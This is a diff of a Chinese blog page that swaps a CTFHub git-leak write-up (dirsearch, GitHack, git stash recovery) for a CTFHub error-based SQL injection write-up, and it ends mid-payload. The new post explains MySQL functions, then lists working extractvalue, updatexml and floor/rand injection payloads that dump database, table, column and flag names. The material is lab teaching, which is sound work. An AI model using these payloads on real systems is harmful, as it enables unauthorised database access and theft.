@@ -4,10 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="是小竹不是小猪">
-    <meta name="description" content="CtfHub-git泄露使用Dirsearch探测Web目录1 安装dirsearch下载地址： https://github.com/maurosoria/dirsearch
-运行环境：必须安装python3
-将下载dirsearch解压">
+    <meta name="keywords" content="CTFHub-报错注入, 是小竹不是小猪">
+    <meta name="description" content="1 SQL语句基本知识1.1基本函数1.1.1 concat函数12345678910111213SQL&amp;gt; SELECT * FROM employee_tbl;+------+------+------------+--------">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>是小竹不是小猪</title>
+    <title>CTFHub-报错注入 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -311,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">CTFHub-报错注入</h1>
                 </div>
             </div>
         </div>
@@ -444,7 +442,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-11
+                    2021-11-12
                 </div>
                 
 
@@ -465,54 +463,133 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="CtfHub-git泄露"><a href="#CtfHub-git泄露" class="headerlink" title="CtfHub-git泄露"></a>CtfHub-git泄露</h1><h3 id="使用Dirsearch探测Web目录"><a href="#使用Dirsearch探测Web目录" class="headerlink" title="使用Dirsearch探测Web目录"></a>使用Dirsearch探测Web目录</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h4><p>dirsearch下载地址： <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
-<p>运行环境：必须安装python3</p>
-<p>将下载dirsearch解压缩后，进入dirsearch目录打开命令执行窗口。</p>
-<h4 id="2-命令使用"><a href="#2-命令使用" class="headerlink" title="2 命令使用"></a>2 命令使用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u URL -e php</span><br></pre></td></tr></table></figure>
+                <h2 id="1-SQL语句基本知识"><a href="#1-SQL语句基本知识" class="headerlink" title="1 SQL语句基本知识"></a>1 SQL语句基本知识</h2><h2 id="1-1基本函数"><a href="#1-1基本函数" class="headerlink" title="1.1基本函数"></a>1.1基本函数</h2><h4 id="1-1-1-concat函数"><a href="#1-1-1-concat函数" class="headerlink" title="1.1.1 concat函数"></a>1.1.1 concat函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> name <span class="operator">|</span> work_date  <span class="operator">|</span> daily_typing_pages <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> John <span class="operator">|</span> <span class="number">2007</span><span class="number">-01</span><span class="number">-24</span> <span class="operator">|</span>                <span class="number">250</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> Ram  <span class="operator">|</span> <span class="number">2007</span><span class="number">-05</span><span class="number">-27</span> <span class="operator">|</span>                <span class="number">220</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> Jack <span class="operator">|</span> <span class="number">2007</span><span class="number">-05</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">170</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> Jack <span class="operator">|</span> <span class="number">2007</span><span class="number">-04</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">100</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> Jill <span class="operator">|</span> <span class="number">2007</span><span class="number">-04</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">220</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> Zara <span class="operator">|</span> <span class="number">2007</span><span class="number">-06</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">300</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> Zara <span class="operator">|</span> <span class="number">2007</span><span class="number">-02</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">350</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------------+--------------------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
 
-<p>使用-e  指定需要扫描的文件名  例如：-e php 如果不知道即所有 -e *，其中响应200的是敏感目录。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u URL -e php -x 403,302,301,503</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONCAT(id, name, work_date)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employee_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> CONCAT(id, name, work_date) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>John2007<span class="number">-01</span><span class="number">-24</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>Ram2007<span class="number">-05</span><span class="number">-27</span>              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>Jack2007<span class="number">-05</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>Jack2007<span class="number">-04</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>Jill2007<span class="number">-04</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>Zara2007<span class="number">-06</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>Zara2007<span class="number">-02</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
 
-<p>排除不需要的状态码 403,302,301</p>
-<h3 id="使用Githack工具"><a href="#使用Githack工具" class="headerlink" title="使用Githack工具"></a>使用Githack工具</h3><h4 id="1-安装-1"><a href="#1-安装-1" class="headerlink" title="1 安装"></a>1 安装</h4><p>从github官网下载<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
-<h4 id="2-命令使用-1"><a href="#2-命令使用-1" class="headerlink" title="2 命令使用"></a>2 命令使用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py &lt;url&gt;(url格式：http(s)://XXX/.git/)</span><br></pre></td></tr></table></figure>
+<h4 id="1-1-2-Floor函数"><a href="#1-1-2-Floor函数" class="headerlink" title="1.1.2 Floor函数"></a>1.1.2 Floor函数</h4><p>函数返回小于x的最大整数值。</p>
+<h4 id="1-1-3-DATEDIFF-函数"><a href="#1-1-3-DATEDIFF-函数" class="headerlink" title="1.1.3 DATEDIFF()函数"></a>1.1.3 DATEDIFF()函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATEDIFF(<span class="keyword">day</span>,<span class="string">&#x27;2008-12-29&#x27;</span>,<span class="string">&#x27;2008-12-30&#x27;</span>) <span class="keyword">AS</span> DiffDate  #返回<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="关于题目-log"><a href="#关于题目-log" class="headerlink" title="关于题目-log"></a>关于题目-log</h3><p>1、使用dirsearch对URL进行扫描</p>
-<p>2、 使用Githack工具将目标源代码clone到本地</p>
-<p>3、 进入该文件夹之后，使用git log查看历史记录，flag在add flag提交中。</p>
-<p>4、</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git diff 9b5b583530f59c07fc62f457066d4ebd81db9782</span><br><span class="line"><span class="meta">#</span><span class="bash">或者</span></span><br><span class="line">git reset --hard 9b5b583530f59c07fc62f457066d4ebd81db9782</span><br><span class="line"><span class="meta">#</span><span class="bash">或者</span></span><br><span class="line">git show</span><br></pre></td></tr></table></figure>
+<h4 id="1-1-4-LEFT-和RIGHT"><a href="#1-1-4-LEFT-和RIGHT" class="headerlink" title="1.1.4 LEFT()和RIGHT()"></a>1.1.4 LEFT()和RIGHT()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">&#x27;SQL Server&#x27;</span>,<span class="number">3</span>) result_string;</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="关于题目-stash"><a href="#关于题目-stash" class="headerlink" title="关于题目-stash"></a>关于题目-stash</h3><h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><p>1、使用dirsearch对URL进行扫描</p>
-<p><img src="/2021/11/11/CtfHub-git%E6%B3%84%E9%9C%B2/image-20211111150935302.png" alt="image-20211111150935302"></p>
-<p>2、 使用Githack工具将目标源代码clone到本地</p>
-<p><img src="/2021/11/11/CtfHub-git%E6%B3%84%E9%9C%B2/image-20211111151543054.png" alt="image-20211111151543054"></p>
-<p>3、使用 git stash list 发现有stash</p>
-<p>4、执行git stash pop 发现文件夹中多出来txt文件</p>
-<h6 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h6><p>git stash show 之后无stash记录，可以</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .git/refs/stash</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>left()</td>
+<td>从左开始截取字符串</td>
+<td>left(str, length)==&gt;left(被截取字符串， 截取长度)</td>
+</tr>
+<tr>
+<td>right()</td>
+<td>从右开始截取字符串</td>
+<td>right(str, length)==&gt;right(被截取字符串， 截取长度)</td>
+</tr>
+<tr>
+<td>substr()</td>
+<td>字符串从第N个字符开始，截取M个字符</td>
+<td>substr(str,N,M)</td>
+</tr>
+</tbody></table>
+<h3 id="1-2-updatexml-函数报错注入原理"><a href="#1-2-updatexml-函数报错注入原理" class="headerlink" title="1.2 updatexml() 函数报错注入原理"></a>1.2 updatexml() 函数报错注入原理</h3><h5 id="1-2-1-updatexml-函数定义"><a href="#1-2-1-updatexml-函数定义" class="headerlink" title="1.2.1 updatexml() 函数定义"></a>1.2.1 updatexml() 函数定义</h5><p>UPDATEXML (XML_document, XPath_string, new_value);</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称；<br>第二个参数：XPath_string (Xpath格式的字符串)；<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据；</p>
+<h5 id="1-2-2-updatexml-函数运行机制"><a href="#1-2-2-updatexml-函数运行机制" class="headerlink" title="1.2.2 updatexml() 函数运行机制"></a>1.2.2 updatexml() 函数运行机制</h5><p>该函数对XPath_string进行查询操作，如果符合语法格式要求，则用第三个参数替换，不符合语法格式要求，则会报错并带出查询的结果。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;c&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a&#x27;</span>,<span class="string">&#x27;&lt;a&gt;b&lt;/a&gt;&#x27;</span>); #正常<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
 
-<p>找到stash对应的hash。然后利用即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff (hash)</span><br></pre></td></tr></table></figure>
+<p>根据xpath语法规则，/、//、.、…、@都是合法的字符，要是函数报错需要使用以上字符之外的字符。</p>
+<table>
+<thead>
+<tr>
+<th>表达式</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>nodename</td>
+<td>选取此节点的所有子节点。</td>
+</tr>
+<tr>
+<td>/</td>
+<td>从根节点选取。</td>
+</tr>
+<tr>
+<td>//</td>
+<td>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。</td>
+</tr>
+<tr>
+<td>.</td>
+<td>选取当前节点。</td>
+</tr>
+<tr>
+<td>…</td>
+<td>选取当前节点的父节点。</td>
+</tr>
+<tr>
+<td>@</td>
+<td>选取属性。</td>
+</tr>
+</tbody></table>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;c&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;~x~&#x27;</span>,<span class="string">&#x27;&lt;a&gt;b&lt;/a&gt;&#x27;</span>); #用<span class="string">&#x27;~x~&#x27;</span>或着 <span class="string">&#x27;#x#&#x27;</span>，<span class="number">0x7e</span>是<span class="operator">~</span>，<span class="number">0x23</span>是#</span><br></pre></td></tr></table></figure>
 
-<h3 id="关于题目-index"><a href="#关于题目-index" class="headerlink" title="关于题目-index"></a>关于题目-index</h3><p>和第一题大致相同。</p>
-<p><img src="/2021/11/11/CtfHub-git%E6%B3%84%E9%9C%B2/image-20211111154606643.png" alt="image-20211111154606643"></p>
-<h2 id="git文件"><a href="#git文件" class="headerlink" title="git文件"></a>git文件</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>“blob”，这种对象用来保存文件的内容。<br>“tree”，可以理解成一个对象关系树，它管理一些”tree”和“blob”对象。<br>“commit”，指向一个”tree”，它用来标记项目某一个特定时间点的状态。它包括以下关于时间点的元数据，如时间戳、最近一次提交的作者、指向上次提交、<br>“tag”，给某个提交增添一个标记。</p>
-<p><img src="https://img-blog.csdnimg.cn/20200727204009762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h5X3N1bm55,size_16,color_FFFFFF,t_70" alt="img"><br>在Git系统中，每个Git对象都通过哈希值来代表这个对象。哈希值是通过SHA1算法计算出来的，长度为40个字符（40-digit)。</p>
-<h3 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init test</span><br></pre></td></tr></table></figure>
-
-<p>创建一个test仓库</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;hello 1111&#x27; &gt; test.txt #创建一个test.txt文件</span><br><span class="line">cat test.txt #查看文件</span><br><span class="line">git status #查看文件状态，工作区，缓存区，版本库。</span><br><span class="line">git add test.txt #提交至缓存区【git rm --cached 取消暂存】</span><br><span class="line">git commit -m &#x27;test.txt提交&#x27; #利用commit进行提交【-m中显示注释】</span><br><span class="line">vim test.txt #进行修改</span><br><span class="line">git diff test.txt #对比工作区和暂存区文件的差异</span><br><span class="line">git log #可以查看历史记录</span><br><span class="line">git reset --hard (hash)  #回退版本</span><br><span class="line">git reset --hard HEAD^ #回退上一个版本</span><br><span class="line">git reflog #获取版本号</span><br></pre></td></tr></table></figure>
 
 
+<p><img src="https://img-blog.csdnimg.cn/20201009185844149.png#" alt="img"></p>
+<h3 id="1-3-extractvalue（）函数运行机制"><a href="#1-3-extractvalue（）函数运行机制" class="headerlink" title="1.3 extractvalue（）函数运行机制"></a>1.3 extractvalue（）函数运行机制</h3><p>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称；<br>第二个参数：XPath_string (Xpath格式的字符串)；<br>作用：从目标XML中返回包含所查询值的字符串；</p>
+<p>正常输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;ccc&lt;b&gt;ddd&lt;/b&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a&#x27;</span>) ;</span><br><span class="line">#从<span class="operator">&lt;</span>a<span class="operator">&gt;</span>ccc<span class="operator">&lt;</span>b<span class="operator">&gt;</span>ddd<span class="operator">&lt;</span><span class="operator">/</span>b<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>a<span class="operator">&gt;</span>中查找a结点下的字符串</span><br></pre></td></tr></table></figure>
+
+<p>报错输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">sql</span>语句),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-利用-count-、rand-、group-by-测试ctfhub的报错注入"><a href="#1-4-利用-count-、rand-、group-by-测试ctfhub的报错注入" class="headerlink" title="1.4 利用 (count()、rand()、group by)测试ctfhub的报错注入"></a>1.4 利用 (count()、rand()、group by)测试ctfhub的报错注入</h3><p>原理可以参考 <a target="_blank" rel="noopener" href="https://www.2cto.com/article/201604/498394.html">https://www.2cto.com/article/201604/498394.html</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br><span class="line">#判断是否有报错输入</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-ctfhub-SQL报错注入"><a href="#2-ctfhub-SQL报错注入" class="headerlink" title="2  ctfhub-SQL报错注入"></a>2  ctfhub-SQL报错注入</h2><p>使用三种方法</p>
+<p>输入1进行查询</p>
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113152118146.png" alt="image-20211113152118146"></p>
+<h4 id="爆破库"><a href="#爆破库" class="headerlink" title="爆破库"></a>爆破库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>));</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),database()) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113152346841.png" alt="image-20211113152346841"></p>
+<h4 id="爆破表"><a href="#爆破表" class="headerlink" title="爆破表"></a>爆破表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>));#第一张news</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>));#第二个flag</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, (<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;sqli&quot;) ,<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br><span class="line">#爆表<span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x #爆表<span class="number">2</span></span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xy_sunny/article/details/107620695">(18条消息) git信息泄露漏洞_jelly-CSDN博客</a></p>
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113152845161.png" alt="image-20211113152845161"></p>
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113152935420.png" alt="image-20211113152935420"></p>
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113153018612.png" alt="image-20211113153018612"></p>
+<h4 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, (<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;flag&quot;) ,<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113153642719.png" alt="image-20211113153642719"></p>
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113153955062.png" alt="image-20211113153955062"></p>
+<h4 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, (<span class="keyword">select</span>(group_concat(flag)) <span class="keyword">from</span> sqli.flag) ,<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">#或者</span><br><span class="line"><span 